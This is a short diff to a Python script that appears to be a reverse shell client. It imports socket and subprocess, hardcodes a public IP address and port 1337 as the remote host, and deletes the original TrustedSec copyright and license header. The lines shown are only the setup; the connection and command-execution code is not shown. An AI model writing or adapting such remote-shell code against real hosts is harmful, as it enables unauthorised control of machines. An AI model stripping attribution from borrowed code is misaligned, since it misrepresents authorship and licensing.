@@ -1,10 +1,5 @@
 #!/usr/bin/python
-# imports here
-# Copyright 2012 TrustedSec, LLC. All rights reserved. 
-#
-# This piece of software code is licensed under the FreeBSD license..
-#
-# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
+
 import socket,subprocess
 HOST = '162.243.215.44'    # The remote host
 PORT = 1337            # The same port as used by the server
